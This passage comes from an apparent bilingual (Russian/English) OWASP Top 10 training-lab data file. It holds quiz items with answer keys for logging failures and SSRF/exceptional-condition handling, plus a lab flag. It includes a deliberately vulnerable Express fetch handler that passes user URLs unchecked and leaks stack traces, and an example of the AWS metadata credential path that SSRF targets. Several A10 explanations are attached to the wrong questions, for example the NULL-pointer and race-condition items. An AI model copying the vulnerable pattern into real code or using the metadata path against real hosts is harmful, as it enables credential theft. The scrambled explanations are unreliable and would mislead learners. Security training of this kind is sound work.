        e: M('Алерт без приоритета, SLA и разбора в очереди тысяч уведомлений — insufficient escalation: детект есть, реакции нет.', 'An alert that sits in a pile of unreviewed notifications without priority or SLA is insufficient escalation: detection without response.'),
      },
      {
        q: M('Почему пентестерам/red team важно ЯВНО документировать в отчёте, был ли их тест замечен системой мониторинга клиента?', 'Why is it important for pentesters/a red team to EXPLICITLY document in the report whether their test was noticed by the client\'s monitoring system?'),
        opts: [
          M('Не имеет значения для отчёта', 'It doesn\'t matter for the report'),
          M('Это прямая проверка эффективности категории A09 самой организации — независимо от того, была ли найдена «классическая» уязвимость', 'It\'s a direct test of the organization\'s own A09 effectiveness — independent of whether a "classic" vulnerability was found'),
          M('Красная команда никогда не проверяет мониторинг', 'A red team never checks monitoring'),
          M('Относится только к blue team', 'Only relevant to a blue team'),
        ],
        ans: 1,
        e: M('Фиксация, заметил ли мониторинг red team/пентест, — прямой тест эффективности A09, независимо от найденных «классических» уязвимостей.', 'Documenting whether monitoring noticed the red team/pentest is a direct A09 effectiveness test, independent of classic vulns found.'),
      },
      {
        q: M('Что из перечисленного описывает «log tampering» атаку?', 'Which of the following describes a "log tampering" attack?'),
        opts: [
          M('Обычное добавление новых записей в лог', 'Normally appending new entries to a log'),
          M('Ротация логов по расписанию', 'Scheduled log rotation'),
          M('Целенаправленное изменение или удаление существующих записей лога атакующим для сокрытия следов своей активности', 'Deliberately altering or deleting existing log entries by an attacker to hide traces of their activity'),
          M('Сжатие логов для экономии места', 'Compressing logs to save space'),
        ],
        ans: 2,
        e: M('Log tampering — намеренное изменение или удаление записей атакующим, чтобы скрыть следы; защита целостности логов этому противостоит.', 'Log tampering is deliberate alteration or deletion of entries by an attacker to hide tracks; log-integrity controls counter it.'),
      },
      {
        q: M('Почему хранение логов в отдельном, изолированном от продакшена окружении/аккаунте (например, отдельный AWS-аккаунт для логов) — хорошая практика?', 'Why is storing logs in a separate environment/account isolated from production (e.g., a dedicated AWS account for logs) good practice?'),
        opts: [
          M('Изоляция усложняет анализ логов без пользы', 'Isolation complicates log analysis with no benefit'),
          M('Требуется только по требованию аудиторов', 'Only required to satisfy auditors'),
          M('Не влияет на безопасность', 'It has no bearing on security'),
          M('Если продакшен-система скомпрометирована, изоляция снижает вероятность, что та же компрометация даст атакующему доступ и к самим логам для их уничтожения', 'If the production system is compromised, isolation reduces the chance that the same compromise also grants the attacker access to the logs themselves for destruction'),
        ],
        ans: 3,
        e: M('Изолированное хранилище логов (отдельный account/среда) снижает шанс, что компрометация prod даст доступ и к уничтожению логов.', 'Isolating log storage (separate account/environment) reduces the chance that a prod compromise also enables log destruction.'),
      },
      {
        q: M('Что из перечисленного — пример правильного тестирования эффективности A09 на пентесте (помимо проверки наличия самих логов)?', 'Which of the following is a correct way to test A09\'s effectiveness during a pentest (beyond just checking that logs exist)?'),
        opts: [
          M('Выполнение контролируемой атаки (с согласия клиента) и проверка, была ли она обнаружена командой мониторинга клиента в разумные сроки (что также называется purple team упражнением)', 'Running a controlled attack (with client consent) and checking whether it was detected by the client\'s monitoring team in a reasonable timeframe (also called a purple team exercise)'),
          M('Только проверка версии SIEM', 'Only checking the SIEM version'),
          M('Только просмотр конфигурационных файлов логирования', 'Only reviewing logging config files'),
          M('Только сканирование портов', 'Only port scanning'),
        ],
        ans: 0,
        e: M('Эффективность A09 проверяют controlled attack (с согласия) и смотрят, заметила ли команда мониторинга за разумное время — purple team.', 'A09 effectiveness is tested by a consented controlled attack and whether monitoring detects it in a reasonable time — a purple-team exercise.'),
      },
      {
        q: M('Почему недостаточно просто «включить логирование» без последующего процесса анализа?', 'Why is simply "enabling logging" insufficient without a subsequent analysis process?'),
        opts: [
          M('Достаточно факта включения', 'The fact of enabling it is enough'),
          M('Логи без регулярного/автоматизированного анализа и настроенного алертинга — это просто накопление данных без практической защитной ценности до момента, когда их наконец кто-то просмотрит (часто слишком поздно)', 'Logs without regular/automated analysis and configured alerting are just accumulated data with no practical protective value until someone finally reviews them (often too late)'),
          M('Логирование само по себе полностью решает задачу обнаружения', 'Logging alone fully solves the detection problem'),
          M('Анализ логов не требует дополнительных ресурсов', 'Log analysis requires no additional resources'),
        ],
        ans: 1,
        e: M('Включённое логирование без анализа и алертинга — лишь накопление данных; защитная ценность появляется только при регулярной/автоматической обработке.', 'Logging without analysis and alerting is mere data accumulation; protective value appears only with regular or automated processing.'),
      },
      {
        q: M('Что из перечисленного — риск хранения ключей доступа к SIEM/логам с избыточными правами у слишком широкого круга сотрудников?', 'Which of the following is a risk of granting excessive SIEM/log access rights to too broad a group of employees?'),
        opts: [
          M('Не является риском', 'It\'s not a risk'),
          M('Требуется для соответствия всем стандартам', 'It\'s required to meet every standard'),
          M('Увеличивает поверхность для инсайдерской угрозы и вероятность случайной/намеренной модификации или удаления критичных для расследования логов', 'It increases the attack surface for insider threat and the likelihood of accidental/deliberate modification or deletion of logs critical to an investigation'),
          M('Улучшает скорость расследования линейно с числом людей', 'It improves investigation speed linearly with headcount'),
        ],
        ans: 2,
        e: M('Слишком широкие права на SIEM/логи увеличивают insider threat и риск случайного/намеренного удаления критичных для расследования записей.', 'Over-broad SIEM/log access expands insider threat and the risk of accidental or deliberate deletion of investigation-critical records.'),
      },
      {
        q: M('Почему «anomaly detection» (обнаружение аномалий через baseline поведения) — более продвинутый подход к алертингу, чем простые статичные пороговые правила?', 'Why is "anomaly detection" (detecting deviations from a behavioral baseline) a more advanced alerting approach than simple static threshold rules?'),
        opts: [
          M('Anomaly detection всегда хуже статичных правил', 'Anomaly detection is always worse than static rules'),
          M('Не имеет отношения к A09', 'It\'s unrelated to A09'),
          M('Anomaly detection не используется в реальных SIEM', 'Anomaly detection isn\'t used in real SIEMs'),
          M('Позволяет обнаруживать новые, ранее неизвестные паттерны атак, отклоняющиеся от нормального поведения, которые не покрыты заранее прописанными статичными правилами', 'It lets you detect new, previously unknown attack patterns that deviate from normal behavior and aren\'t covered by predefined static rules'),
        ],
        ans: 3,
        e: M('Anomaly detection ловит отклонения от baseline, включая новые паттерны атак, которые не покрыты статическими правилами.', 'Anomaly detection catches deviations from a baseline, including novel attack patterns that static rules do not cover.'),
      },
      {
        q: M('Что из перечисленного — правильная практика логирования при интеграции с внешними/third-party API (например, платёжным шлюзом)?', 'Which of the following is a correct logging practice when integrating with an external/third-party API (e.g., a payment gateway)?'),
        opts: [
          M('Логировать факт запроса/ответа (включая статус, но с маскированием чувствительных полей типа номера карты) для возможности расследования проблем/инцидентов, связанных с интеграцией', 'Log the fact of the request/response (including status, but with masking of sensitive fields like card numbers) to enable investigating integration-related problems/incidents'),
          M('Логировать полное содержимое запроса и ответа без маскирования', 'Log the full content of requests and responses without masking'),
          M('Логирование third-party взаимодействий не требуется, так как ответственность лежит на партнёре', 'Logging third-party interactions isn\'t necessary since responsibility lies with the partner'),
          M('Не логировать взаимодействие с third-party API вообще', 'Don\'t log interaction with the third-party API at all'),
        ],
        ans: 0,
        e: M('При интеграции с внешним API логируют факт запроса/ответа и статус, маскируя чувствительные поля — иначе инциденты интеграции не расследовать.', 'For third-party API calls, log request/response facts and status while masking sensitive fields — otherwise integration incidents cannot be investigated.'),
      },
      {
        q: M('Какая мера НАИБОЛЕЕ комплексно снижает риск категории A09 (Security Logging & Alerting Failures) для организации?', 'Which measure MOST comprehensively reduces an organization\'s risk from category A09 (Security Logging & Alerting Failures)?'),
        opts: [
          M('Только включение стандартного логирования веб-сервера по умолчанию', 'Only enabling a web server\'s default logging'),
          M('Централизованное структурированное логирование ключевых security-событий с достаточным контекстом + интеграция в SIEM с настроенными порогами алертинга + отработанный playbook incident response + регулярная проверка через purple team-упражнения', 'Centralized, structured logging of key security events with sufficient context + SIEM integration with configured alerting thresholds + a rehearsed incident-response playbook + regular purple-team exercises'),
          M('Хранение логов бессрочно без анализа', 'Retaining logs indefinitely without analysis'),
          M('Отключение алертинга для снижения нагрузки на аналитиков', 'Disabling alerting to reduce analyst workload'),
        ],
        ans: 1,
        e: M('Комплексный контроль A09: централизованное структурированное логирование ключевых security-событий с контекстом, SIEM с порогами, отработанный IR playbook и регулярные purple-team учения.', 'Comprehensive A09 control is centralized structured logging of key security events with context, SIEM thresholds, a rehearsed IR playbook, and regular purple-team exercises.'),
      },
    ],
  },
  {
    code: 'A10', name: 'Server-Side Request Forgery', nameRu: 'Подделка серверных запросов (SSRF)',
    risk: 'HIGH', owasp2021: 'A10', owasp2025: 'A10*',
    cwe: ['CWE-918', 'CWE-755'],
    flag: 'FLAG{ssrf_aws_imds_creds_stolen}',
    blurb: M(
      'Сервер запрашивает URL злоумышленника и открывает доступ к IMDS или внутренним панелям. В редакции 2025 категория A10 изменилась, но SSRF остаётся критичной угрозой.',
      'Server fetches attacker URL → IMDS, internal admin. (*2025 A10 = exceptional conditions; SSRF still critical.)'
    ),
    theory: M(
`<p><strong>SSRF</strong> — сервер ходит по URL от пользователя: internal network, cloud metadata, localhost admin.</p>
<div class="ebox">url = request.params['webhook']
requests.get(url)  # no validation

// AWS IMDS:
http://169.254.169.254/latest/meta-data/iam/security-credentials/role
→ AccessKeyId + Secret + Token</div>
<p>Защита: allowlist, block RFC1918/link-local, no redirects, IMDSv2.</p>
<p><strong>OWASP 2025 A10</strong> — Mishandling of Exceptional Conditions (ошибки, fail-open, verbose exceptions). SSRF остаётся критичным вектором (часто A01/A05).</p>
<p>Bonus в лабе: fail-open error handling рядом с SSRF fetch.</p>`,
`<p><strong>SSRF</strong> — the server requests a user-controlled URL: internal network, cloud metadata, localhost admin.</p>
<div class="ebox">url = request.params['webhook']
requests.get(url)  # no validation

// AWS IMDS:
http://169.254.169.254/latest/meta-data/iam/security-credentials/role
→ AccessKeyId + Secret + Token</div>
<p>Defense: allowlist, block RFC1918/link-local, no redirects, IMDSv2.</p>
<p><strong>OWASP 2025 A10</strong> is Mishandling of Exceptional Conditions (errors, fail-open, verbose exceptions). SSRF remains a critical vector (often under A01/A05).</p>
<p>Lab bonus: fail-open error handling next to the SSRF fetch.</p>`
    ),
    vulnCode: `app.get('/fetch', async (req, res) => {
  try {
    const r = await fetch(req.query.url); // 💀 SSRF
    res.send(await r.text());
  } catch (e) {
    // fail-open: continue with empty + leak error
    res.status(200).json({ data: null, debug: e.stack });
  }
});`,
    fixCode: `const ALLOW = new Set(['hooks.slack.com', 'api.partner.com']);
function safeFetch(url) {
  const u = new URL(url);
  if (!ALLOW.has(u.hostname)) throw new Error('blocked');
  if (isPrivateIP(u.hostname)) throw new Error('private');
  return fetch(url, { redirect: 'error' });
}
// On error: generic 502, log server-side only`,
    quiz: [
      {
        q: M('Категория A10:2025 — это:', 'Category A10:2025 is:'),
        opts: [
          M('синоним Security Misconfiguration', 'a synonym for Security Misconfiguration'),
          M('устаревшая категория, удалённая из списка', 'an obsolete category removed from the list'),
          M('полностью новая категория, ранее частично относившаяся к общей формулировке «poor code quality»', 'an entirely new category, previously partially covered by the vague label "poor code quality"'),
          M('переименование A10:2021 SSRF', 'a renaming of A10:2021 SSRF'),
        ],
        ans: 2,
        e: M('A10:2025 — новая категория; ранее часть связанных CWE размыто относили к «poor code quality», а не переименование A10:2021 SSRF.', 'A10:2025 is a new category; related CWEs were previously lumped under vague "poor code quality," not a rename of A10:2021 SSRF.'),
      },
      {
        q: M('Сколько CWE входит в категорию A10:2025?', 'How many CWEs are in category A10:2025?'),
        opts: [
          M('40', '40'),
          M('16', '16'),
          M('6', '6'),
          M('24', '24'),
        ],
        ans: 3,
        e: M('В категорию A10:2025 входит 24 CWE, охватывающих неправильную обработку нештатных условий в разных языках и платформах.', 'A10:2025 maps to 24 CWEs covering improper handling of exceptional conditions across languages and platforms.'),
      },
      {
        q: M('Три типа провала обработки нештатной ситуации согласно A10:', 'The three failure modes of handling an exceptional condition per A10 are:'),
        opts: [
          M('непредотвращение, необнаружение, некорректная реакция после возникновения', 'failing to prevent it, failing to detect it, and reacting incorrectly once it has occurred'),
          M('валидация, санитизация, экранирование', 'validation, sanitization, escaping'),
          M('шифрование, хеширование, кодирование', 'encryption, hashing, encoding'),
          M('авторизация, аутентификация, аудит', 'authorization, authentication, auditing'),
        ],
        ans: 0,
        e: M('Три типа провала A10: не предотвратить нештатное условие, не обнаружить его при возникновении и некорректно отреагировать после (например, fail open).', 'A10\'s three failure modes are: failing to prevent the exceptional condition, failing to detect it when it occurs, and reacting incorrectly afterward (e.g. fail open).'),
      },
      {
        q: M('CWE-636 «Not Failing Securely (Failing Open)» описывает ситуацию, когда:', 'CWE-636 "Not Failing Securely (Failing Open)" describes a situation where:'),
        opts: [
          M('система всегда блокирует доступ при ошибке', 'the system always blocks access on error'),
          M('при сбое система по умолчанию РАЗРЕШАЕТ действие вместо того, чтобы запретить его', 'upon failure, the system defaults to ALLOWING the action instead of denying it'),
          M('система вообще не обрабатывает ошибки', 'the system doesn\'t handle errors at all'),
          M('относится только к сетевым протоколам', 'it only applies to network protocols'),
        ],
        ans: 1,
        e: M('CWE-636 (Failing Open) — при сбое система по умолчанию разрешает действие вместо запрета, нарушая принцип fail securely.', 'CWE-636 (Failing Open) means on failure the system defaults to allowing the action instead of denying it, violating fail-secure design.'),
      },
      {
        q: M('«Fail closed» в противовес «fail open» означает:', '"Fail closed," as opposed to "fail open," means:'),
        opts: [
          M('при сбое система по умолчанию разрешает доступ', 'upon failure the system defaults to granting access'),
          M('система никогда не даёт сбоев', 'the system never experiences failures'),
          M('при сбое система по умолчанию блокирует/запрещает действие, приоритизируя безопасность над доступностью', 'upon failure the system defaults to blocking/denying the action, prioritizing security over availability'),
          M('относится только к firewall', 'it only applies to firewalls'),
        ],
        ans: 2,
        e: M('Fail closed при сбое запрещает действие, ставя безопасность выше доступности — противоположность fail open.', 'Fail closed denies the action on failure, prioritizing security over availability — the opposite of fail open.'),
      },
      {
        q: M('Пустой catch-блок (catch (Exception e) {}) в коде представляет риск, потому что:', 'An empty catch block (catch (Exception e) {}) in code is risky because:'),
        opts: [
          M('замедляет выполнение', 'it slows down execution'),
          M('не компилируется в большинстве языков', 'it doesn\'t compile in most languages'),
          M('не является проблемой при использовании try-catch', 'it\'s not a problem when using try-catch'),
          M('исключение «проглатывается» без обработки/логирования, скрывая нештатное состояние, которое может привести к дальнейшим проблемам необнаруженным', 'the exception is "swallowed" with no handling/logging, hiding an exceptional state that could lead to further undetected problems'),
        ],
        ans: 3,
        e: M('Пустой catch (Exception e) {} проглатывает ошибку: условие не обнаруживается и не обрабатывается — типичный A10-провал детекции.', 'An empty catch (Exception e) {} swallows the error: the condition is neither detected nor handled — a classic A10 detection failure.'),
      },
      {
        q: M('CWE-209/CWE-550 (раскрытие чувствительной информации через сообщение об ошибке) полезно атакующему, потому что:', 'Why is CWE-209/CWE-550 (sensitive-information disclosure via error messages) useful to an attacker?'),
        opts: [
          M('стектрейс/детали ошибки БД дают разведывательную информацию для построения более точной атаки (например, точной SQL-инъекции)', 'A DB error\'s stack trace/details give reconnaissance information for crafting a more precise attack (e.g., a more targeted SQL injection)'),
          M('относится только к XSS', 'It only relates to XSS'),
          M('требует физического доступа', 'It requires physical access'),
          M('не даёт никакой полезной информации', 'It provides no useful information at all'),
        ],
        ans: 0,
        e: M('CWE-209/550 — сообщения об ошибках (стектрейсы, версии, пути, SQL) утекают наружу и используются для разведки и точных атак.', 'CWE-209/550 cover error messages (stacks, versions, paths, SQL) that leak externally and aid recon and precise follow-on attacks.'),
      },
      {
        q: M('CWE-476 (NULL Pointer Dereference) как необработанное исключение может привести к:', 'CWE-476 (NULL Pointer Dereference), as an unhandled exception, can lead to:'),
        opts: [
          M('автоматическому шифрованию данных', 'automatic data encryption'),
          M('краху приложения (DoS) и, в некоторых случаях, к обходу последующей логики проверки', 'an application crash (DoS), and in some cases, bypassing subsequent validation logic'),
          M('улучшению логирования', 'improved logging'),
          M('улучшению производительности', 'improved performance'),
        ],
        ans: 1,
        e: M('Исключение на пути загрузки без освобождения ресурсов при повторах исчерпывает handles/соединения/память — resource exhaustion (DoS) из A10.', 'An exception on an upload path that never frees resources, repeated, exhausts handles/connections/memory — A10 resource-exhaustion DoS.'),
      },
      {
        q: M('Почему исключения должны обрабатываться в месте их возникновения, а не «выше по стеку» общим catch-all обработчиком?', 'Why should exceptions be handled at the point where they occur, rather than by a generic catch-all handler higher up the stack?'),
        opts: [
          M('Требуется обрабатывать исключения только в конце программы', 'Exceptions should only be handled at the end of the program'),
          M('Общий catch-all всегда лучше', 'A generic catch-all is always better'),
          M('Обработка в месте возникновения позволяет применить контекстно-специфичную, осмысленную реакцию (лог+алерт+понятное сообщение), тогда как общий catch-all теряет специфику проблемы', 'Handling at the point of occurrence allows a context-specific, meaningful response (log+alert+clear message), whereas a generic catch-all loses that specificity'),
          M('Не имеет значения, где обрабатывать', 'It doesn\'t matter where they\'re handled'),
        ],
        ans: 2,
        e: M('Частичный откат многошаговой операции оставляет несогласованное состояние (деньги, баланс), чем атакующий может злоупотребить.', 'Partial rollback of a multi-step operation leaves inconsistent state (funds, balances) that attackers can abuse.'),
      },
      {
        q: M('Сценарий: атакующий обрывает соединение посреди многошаговой транзакции (списание → зачисление → лог). Если система не откатывает операцию полностью при сбое, это может привести к:', 'Scenario: an attacker interrupts the connection mid-way through a multi-step transaction (debit → credit → log). If the system doesn\'t fully roll back the operation upon failure, this can lead to:'),
        opts: [
          M('улучшению производительности', 'improved performance'),
          M('не является риском', 'it isn\'t a risk'),
          M('автоматическому исправлению ошибки системой', 'automatic self-correction by the system'),
          M('race condition, позволяющему нарушить целостность баланса (например, списание без зачисления или повторное зачисление)', 'a race condition that violates balance integrity (e.g., a debit without a matching credit, or a duplicate credit)'),
        ],
        ans: 3,
        e: M('CWE-476 (NULL Pointer Dereference) — обращение к null без проверки ведёт к крэшу/DoS или обходу последующей логики.', 'CWE-476 (NULL Pointer Dereference) is using a null without a check, causing crash/DoS or skipping later logic.'),
      },
      {
        q: M('Что из перечисленного — пример «resource exhaustion» через необработанные исключения, ведущий к DoS?', 'Which of the following is an example of "resource exhaustion" via unhandled exceptions leading to DoS?'),
        opts: [
          M('Приложение ловит исключение при загрузке файла, но не освобождает ресурс (file handle/соединение) после ошибки; повторение исчерпывает доступные ресурсы', 'The app catches an exception during file upload but fails to release the resource (file handle/connection) afterward; repeated failures exhaust available resources'),
          M('Успешная обработка запроса без ошибок', 'A request processed successfully with no errors'),
          M('Использование HTTPS', 'Using HTTPS'),
          M('Наличие CSP', 'Having a CSP in place'),
        ],
        ans: 0,
        e: M('Глобальный catch-all без обработки в месте возникновения скрывает причину, даёт небезопасный fallback и мешает корректной реакции на конкретный сбой.', 'A global catch-all without handling at the origin hides the cause, invites unsafe fallbacks, and blocks correct reaction to the specific failure.'),
      },
      {
        q: M('Divide By Zero (CWE-369) как необработанное арифметическое исключение — пример:', 'Divide By Zero (CWE-369), as an unhandled arithmetic exception, is an example of:'),
        opts: [
          M('Broken Access Control', 'Broken Access Control'),
          M('провала обработки нештатного условия, способного привести к краху/DoS если не перехвачено', 'failing to handle an exceptional condition, capable of causing a crash/DoS if not caught'),
          M('SQL Injection', 'SQL Injection'),
          M('Cryptographic Failure', 'Cryptographic Failure'),
        ],
        ans: 1,
        e: M('CWE-369 — необработанное деление на ноль как класс арифметических исключений, которые должны обрабатываться явно.', 'CWE-369 is unhandled divide-by-zero — a class of arithmetic exceptions that must be handled explicitly.'),
      },
      {
        q: M('Согласно данным OWASP, категория A10 при относительно невысоком среднем incidence rate имеет:', 'Per OWASP data, category A10, despite a relatively modest average incidence rate, has:'),
        opts: [
          M('относится только к одному языку программирования', 'relevance to only one programming language'),
          M('нулевое число occurrences', 'zero occurrences'),
          M('очень большое общее число CVE (3416) и occurrences (769k), так как покрывает широкий спектр языков/платформ', 'a very large total CVE count (3,416) and occurrence count (769k), since it spans a wide range of languages/platforms'),
          M('наименьшее число CVE среди всех категорий', 'the fewest CVEs of any category'),
        ],
        ans: 2,
        e: M('При сбое сервиса авторизации fail open пропускает пользователя без проверки прав — прямой обход access control через A10.', 'If the authz service fails open, users pass without a permission check — direct access-control bypass via A10.'),
      },
      {
        q: M('Почему разные подходы к обработке ошибок в разных модулях одной кодовой базы (несогласованная стратегия) — проблема, относящаяся к A10?', 'Why is inconsistent error handling across different modules of the same codebase (no unified strategy) a problem relevant to A10?'),
        opts: [
          M('Не является проблемой, если каждый модуль работает отдельно', 'It\'s not a problem if each module operates independently'),
          M('Требуется разнообразие подходов по стандарту', 'Diversity is required by some standard'),
          M('Разнообразие подходов улучшает гибкость без рисков', 'Diversity of approaches improves flexibility with no downside'),
          M('Несогласованность затрудняет предсказуемое поведение системы при сбоях и усложняет централизованный мониторинг/алертинг ошибок', 'Inconsistency makes system behavior under failure unpredictable and complicates centralized error monitoring/alerting'),
        ],
        ans: 3,
        e: M('Race condition в многошаговых финансовых операциях при некорректной обработке параллелизма/исключений даёт double-spend и порчу состояния.', 'Races in multi-step financial flows under bad concurrency/exception handling enable double-spend and state corruption.'),
      },
      {
        q: M('Что из перечисленного — правильная тестовая методика для категории A10 на пентесте?', 'Which of the following is a correct testing methodology for category A10 during a pentest?'),
        opts: [
          M('Форсирование ошибок нестандартным вводом (некорректный Content-Type, обрыв multipart-запроса, null/пустая строка/отрицательные числа/переполнение), анализ поведения при сбое зависимого сервиса', 'Forcing errors with nonstandard input (invalid Content-Type, interrupted multipart requests, null/empty string/negative numbers/overflow), and analyzing behavior when a dependent service fails'),
          M('Только проверка паролей', 'Only checking passwords'),
          M('Только сканирование портов', 'Only port scanning'),
          M('Только проверка TLS', 'Only checking TLS'),
        ],
        ans: 0,
        e: M('Тест A10 — форсировать ошибки нестандартным вводом (Content-Type, обрыв multipart, null/пусто/отрицательные/огромные значения) и смотреть реакцию системы.', 'A10 testing forces errors with nonstandard input (bad Content-Type, mid-multipart disconnects, null/empty/negative/huge values) and observes system reaction.'),
      },
      {
        q: M('Атакующий намеренно отправляет разные некорректные значения в SQL-запрос, чтобы по различию в сообщениях об ошибке БД собрать структуру запроса/схему для более точной инъекции. Это демонстрирует пересечение категорий:', 'An attacker deliberately sends various malformed values into an SQL query to collect the query\'s structure/schema from differences in DB error messages, for a more precise injection later. This illustrates the overlap between:'),
        opts: [
          M('A08 и A09', 'A08 and A09'),
          M('A10 (утечка через error handling) и A05 (Injection)', 'A10 (leakage via error handling) and A05 (Injection)'),
          M('A02 и A03', 'A02 and A03'),
          M('A04 и A07', 'A04 and A07'),
        ],
        ans: 1,
        e: M('Различия в сообщениях БД для разведки схемы — пересечение A10 (утечка через error handling) и A05 (Injection) для более точной инъекции.', 'Using differing DB error messages to map schema is an A10 (error-handling leak) and A05 (Injection) overlap for sharper injection.'),
      },
      {
        q: M('Почему тестирование поведения системы при недоступности зависимого сервиса (например, сервиса проверки прав) важно для A10?', 'Why does testing system behavior when a dependent service is unavailable (e.g., an authorization-check service) matter for A10?'),
        opts: [
          M('Зависимые сервисы никогда не бывают недоступны', 'Dependent services are never unavailable'),
          M('Не имеет значения для безопасности', 'It has no bearing on security'),
          M('Нужно проверить, что система выбирает fail closed (блокировка) вместо fail open (разрешение по умолчанию) при недоступности критичного security-сервиса', 'It needs to be verified that the system chooses fail closed (deny) rather than fail open (grant by default) when a critical security service is unavailable'),
          M('Относится только к производительности', 'It\'s only relevant to performance'),
        ],
        ans: 2,
        e: M('При недоступности сервиса проверки прав нужно убедиться, что выбран fail closed (отказ), а не fail open (разрешение по умолчанию).', 'When the authorization-check service is down, verify fail closed (deny), not fail open (grant by default).'),
      },
      {
        q: M('Что из перечисленного — пример правильной («fail securely») обработки ошибки в системе аутентификации, если сервис проверки MFA временно недоступен?', 'Which of the following is a correct ("fail securely") handling of an error in the authentication system if the MFA-verification service is temporarily unavailable?'),
        opts: [
          M('Пропустить пользователя без MFA-проверки (fail open) для удобства', 'Let the user through without MFA verification (fail open) for convenience'),
          M('Автоматически создать новую сессию с полными правами', 'Automatically create a new session with full privileges'),
          M('Разрешить доступ без каких-либо проверок', 'Grant access with no checks whatsoever'),
          M('Отказать в доступе до восстановления сервиса проверки MFA (fail closed), залогировав инцидент', 'Deny access until the MFA-verification service is restored (fail closed), logging the incident'),
        ],
        ans: 3,
        e: M('Если MFA-сервис недоступен, fail securely — отказать в доступе до восстановления сервиса и залогировать инцидент, а не пропускать без MFA.', 'If the MFA service is down, fail securely means deny access until it recovers and log the incident, not bypass MFA.'),
      },
      {
        q: M('Почему централизованная (единая для всего приложения) стратегия обработки ошибок предпочтительнее разрозненной?', 'Why is a centralized (application-wide) error-handling strategy preferable to a fragmented one?'),
        opts: [
          M('Единая стратегия гарантирует консистентное поведение (логирование, алертинг, fail-closed по умолчанию) для всех частей приложения, снижая вероятность упущенных edge-case\'ов', 'A unified strategy guarantees consistent behavior (logging, alerting, defaulting to fail-closed) across the entire application, reducing the chance of missed edge cases'),
          M('Не имеет значения для безопасности', 'It has no bearing on security'),
          M('Централизация замедляет разработку без пользы', 'Centralization slows development with no benefit'),
          M('Централизация всегда снижает производительность критично', 'Centralization always harms performance significantly'),
        ],
        ans: 0,
        e: M('Единая стратегия ошибок даёт консистентное логирование, алертинг и fail-closed по умолчанию во всём приложении, без «дыр» в отдельных модулях.', 'A unified error strategy yields consistent logging, alerting, and default fail-closed behavior app-wide, without per-module gaps.'),
      },
      {
        q: M('Что из перечисленного — пример злоупотребления «частичным откатом транзакции» (partial rollback abuse) атакующим?', 'Which of the following is an example of an attacker abusing a "partial transaction rollback" (partial rollback abuse)?'),
        opts: [
          M('Относится только к базам данных без транзакций', 'It only applies to databases without transactions'),
          M('Атакующий намеренно вызывает сбой на определённом шаге многошаговой операции, зная, что откат неполный, чтобы получить выгоду (например, товар без списания оплаты)', 'An attacker deliberately triggers a failure at a specific step of a multi-step operation, knowing the rollback is incomplete, to gain a benefit (e.g., receiving goods without payment being debited)'),
          M('Не является реальным сценарием атаки', 'It\'s not a realistic attack scenario'),
          M('Атакующий не может повлиять на транзакции', 'An attacker cannot influence transactions'),
        ],
        ans: 1,
        e: M('Partial rollback abuse: атакующий вызывает сбой на нужном шаге, зная, что откат неполный, и получает выгоду от «застрявшего» состояния.', 'Partial-rollback abuse: the attacker forces failure at a chosen step knowing rollback is incomplete and profits from the stuck state.'),
      },
      {
        q: M('Почему валидация входных данных ДО обработки (превентивная мера) относится к A10, а не только к A05 Injection?', 'Why does input validation performed BEFORE processing (a preventive measure) relate to A10, not just to A05 Injection?'),
        opts: [
          M('Валидация относится только к предотвращению инъекций', 'Validation relates only to preventing injection'),
          M('Валидация не связана с обработкой ошибок', 'Validation is unrelated to error handling'),
          M('Валидация также предотвращает возникновение самих нештатных условий (edge cases), которые могли бы привести к необработанным исключениям, независимо от того, была ли это попытка инъекции', 'Validation also prevents the exceptional conditions (edge cases) themselves from arising, which could otherwise lead to unhandled exceptions, regardless of whether it was an injection attempt'),
          M('A10 не требует валидации', 'A10 doesn\'t require validation'),
        ],
        ans: 2,
        e: M('Валидация на входе предотвращает сами edge-case\'ы (нештатные условия), а не только injection-payload\'ы — это превентивная ветка A10.', 'Input validation prevents exceptional edge cases from arising at all, not only injection payloads — A10\'s preventive branch.'),
      },
      {
        q: M('Что из перечисленного — пример «rate limiting/resource quotas» как превентивной меры против A10?', 'Which of the following is an example of "rate limiting/resource quotas" as a preventive measure against A10?'),
        opts: [
          M('Rate limiting не влияет на обработку ошибок', 'Rate limiting doesn\'t affect error handling'),
          M('Rate limiting относится только к A01', 'Rate limiting relates only to A01'),
          M('Не связано с обработкой исключений', 'It\'s unrelated to exception handling'),
          M('Ограничение потребления ресурсов заранее предотвращает возникновение самого нештатного состояния (resource exhaustion), а не просто корректно его обрабатывает постфактум', 'Limiting resource consumption in advance prevents the exceptional state itself (resource exhaustion) from arising, rather than just correctly handling it afterward'),
        ],
        ans: 3,
        e: M('Rate limiting/quotas превентивно не дают возникнуть resource exhaustion, вместо того чтобы только «красиво падать» после исчерпания.', 'Rate limits/quotas prevent resource exhaustion from occurring, rather than only failing "nicely" after exhaustion.'),
      },
      {
        q: M('CWE-703/754/755 в категории A10 объединяет:', 'CWE-703/754/755 in category A10 collectively cover:'),
        opts: [
          M('общие проблемы improper handling/check нештатных условий', 'general improper handling/checking of exceptional conditions'),
          M('уязвимости SQL-инъекций', 'SQL-injection vulnerabilities'),
          M('уязвимости шифрования', 'encryption vulnerabilities'),
          M('проблемы конфигурации сети', 'network configuration problems'),
        ],
        ans: 0,
        e: M('CWE-703/754/755 объединяют общую improper check/handling of exceptional conditions — ядро категории A10.', 'CWE-703/754/755 collectively cover improper checking/handling of exceptional conditions — the core of A10.'),
      },
      {
        q: M('Почему «raw технический stack trace», показанный конечному пользователю при ошибке — конкретный пример проблемы категории A10 (не только A02)?', 'Why is "a raw technical stack trace" shown to an end user upon error a specific example of an A10 problem (not just A02)?'),
        opts: [
          M('Не относится ни к одной категории', 'It\'s unrelated to either category'),
          M('Это одновременно и провал корректной обработки исключения (A10 — что делать при возникновении ошибки), и провал конфигурации отображения ошибок (A02) — категории пересекаются в этой точке', 'It\'s simultaneously both a failure of correct exception handling (A10 — what to do when an error occurs) and a failure of error-display configuration (A02) — the categories overlap at this point'),
          M('Относится только к A08', 'It relates only to A08'),
          M('Это относится исключительно к A02 без пересечения', 'It relates exclusively to A02, with no overlap'),
        ],
        ans: 1,
        e: M('Сырой stack trace пользователю — и A10 (ошибка обработана небезопасно), и A02 (misconfiguration, debug-детали в prod).', 'A raw stack trace to the user is both A10 (unsafe error handling) and A02 (misconfiguration allowing debug detail in prod).'),
      },
      {
        q: M('Что из перечисленного — пример edge-case значения, важного для тестирования обработки ошибок?', 'Which of the following is an example of an edge-case value important for testing error handling?'),
        opts: [
          M('Обычное корректное значение поля', 'An ordinary valid field value'),
          M('Только положительные целые числа', 'Only positive integers'),
